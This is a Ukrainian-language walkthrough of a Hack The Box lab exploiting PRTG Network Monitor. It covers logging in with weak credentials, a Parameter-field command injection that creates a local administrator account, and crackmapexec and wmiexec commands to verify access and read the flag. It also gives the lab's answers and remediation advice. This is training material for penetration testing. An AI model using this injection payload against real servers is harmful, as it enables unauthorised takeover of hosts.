# Attacking Common Applications — PRTG Network Monitor

Модуль: [Attacking Common Applications](https://academy.hackthebox.com/app/module/113)
Урок: [PRTG Network Monitor](https://academy.hackthebox.com/app/module/113/section/1094)
Ціль: `10.129.201.50` (APP03, Windows Server 2019 Build 17763)

Q1: `18.1.37.13946`
Q2 (`administrator Desktop\flag.txt`): `WhOs3_m0nit0ring_wH0?`

## Концепція

PRTG Network Monitor — це система мережевого моніторингу від Paessler, і після успішного логіну функція **Notifications** з опцією `EXECUTE PROGRAM` дозволяє запускати попередньо визначені `.exe`/`.ps1`-скрипти з довільними параметрами; оскільки поле Parameter конкатенується напряму в PowerShell-команду без escaping спецсимволів, це відкриває класичну command injection (CWE-78) через символ `;`, який дозволяє дописувати власні команди — у цьому випадку створення нового користувача з правами локального адміністратора.

## Крок 1 — Nmap-скан для виявлення сервісу (термінал)

```bash
sudo nmap -sV -p- --open -T4 10.129.201.50
```

У виводі помічаємо:
```
8080/tcp open http Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
```

Пояснення: nmap вже частково розкрив версію через service detection (banner grabbing HTTP-сервера Indy, на якому побудований PRTG).

## Крок 2 — Fingerprint версії через HTTP (термінал)

```bash
curl -s http://10.129.201.50:8080/index.htm | grep -i version
```

Ключовий рядок у виводі:
```
<span class="prtgversion">&nbsp;PRTG Network Monitor 18.1.37.13946 </span>
```

**Q1 = `18.1.37.13946`**

Пояснення: цей рядок рендериться в HTML-футері головної сторінки навіть без логіну, аналогічно тому, як Jenkins показує версію в заголовку `X-Jenkins` — це загальний паттерн для web-based моніторингових панелей, які показують версію публічно для довіри/support-запитів.

## Крок 3 — Brute-force логіна (браузер + підбір кредів)

Відкрити `http://10.129.201.50:8080/` у браузері.

Перша спроба дефолтними кредами `prtgadmin:prtgadmin` не спрацювала; робочою парою для HTB є `prtgadmin:Password123`.

## Крок 4 — Перехід у налаштування сповіщень (браузер)

Навести курсор на **Setup** (правий верхній кут) → **Account Settings** → **Notifications**

Прямий URL: `http://10.129.201.50:8080/myaccount.htm?tabid=2`

## Крок 5 — Створення шкідливого сповіщення (браузер)

Натиснути **Add new notification**

Прямий URL: `http://10.129.201.50:8080/editnotification.htm?id=new&tabid=1`

Дії у формі:
1. Задати ім'я сповіщення (наприклад `pwn`)
2. Прогорнути вниз, поставити галочку **EXECUTE PROGRAM**
3. У **Program File** вибрати з випадного списку: `Demo exe notification - outfile.ps1`
4. У полі **Parameter** ввести:
```
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```
5. Натиснути **Save**

Пояснення вразливості: PRTG будує командний рядок PowerShell шляхом прямої підстановки вмісту поля Parameter без sanitization, тому символ `;` (роздільник команд у PowerShell/cmd) дозволяє додавати довільні наступні команди — тут послідовно створюється новий локальний користувач `prtgadm1` з паролем `Pwn3d_by_PRTG!`, а потім він додається в групу `administrators`.

## Крок 6 — Запуск сповіщення (браузер)

Повернутись на `http://10.129.201.50:8080/myaccount.htm?tabid=2`, знайти щойно створене сповіщення `pwn` у списку, натиснути кнопку **Test**.

У випадному повідомленні з'явиться: `EXE notification is queued up`

Пояснення: це blind command execution — прямого фідбеку про виконання команди немає, оскільки запуск відбувається асинхронно на боці сервера через внутрішній notification engine PRTG; успіх перевіряється зовнішнім способом на наступному кроці.

## Крок 7 — Перевірка нового привілейованого акаунту (термінал)

```bash
sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p 'Pwn3d_by_PRTG!'
```

Результат:
```
SMB 10.129.201.50 445 APP03 [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
```

Пояснення: позначка `(Pwn3d!)` від CrackMapExec підтверджує, що облік `prtgadm1` має права локального адміністратора на хості — саме це і потрібно було досягти через command injection.

## Крок 8 — Читання прапора через WMI (термінал)

```bash
impacket-wmiexec APP03/prtgadm1:'Pwn3d_by_PRTG!'@10.129.201.50 "type C:\Users\Administrator\Desktop\flag.txt"
```

Результат:
```
WhOs3_m0nit0ring_wH0?
```

**Q2 = `WhOs3_m0nit0ring_wH0?`**

Пояснення: `wmiexec` виконує команди через протокол WMI (Windows Management Instrumentation) без потреби у повноцінному інтерактивному shell'і — це швидший спосіб виконати одноразову команду (типу `type` файлу), ніж піднімати SMB/RDP-сесію.

## Чому це працює (root cause)

- **Опис:** Слабкий пароль веб-панелі PRTG (`prtgadmin:Password123`) дав доступ до функції Notifications, чиє поле Parameter уразливе до command injection через незахищену конкатенацію рядків при побудові PowerShell-команди.
- **Технічні деталі:** CWE-78 (OS Command Injection) у поєднанні з CWE-521 — PRTG довіряє автентифікованому користувачу довільно формувати параметри для `EXECUTE PROGRAM` без валідації спецсимволів `;`, `&`, `|`, що дозволяє escape з контексту очікуваного одного параметра в повноцінний ланцюжок команд.
- **Ризик/Імпакт:** Повна компрометація хоста з правами `NT AUTHORITY\SYSTEM` (бо служба PRTG Core Server зазвичай працює як SYSTEM), включно зі створенням нового привілейованого користувача, доступом до файлової системи, LSASS-пам'яті та потенційним pivoting на домен.
- **Рекомендації:** Оновити PRTG до останньої версії (поточна на момент курсу — 21.3.71, тобто ціль застаріла на кілька релізів), використовувати сильні унікальні паролі для веб-панелі, обмежити доступ до `/editnotification.htm` через мережеву сегментацію, регулярно аудитувати список локальних адміністраторів на моніторингових серверах.
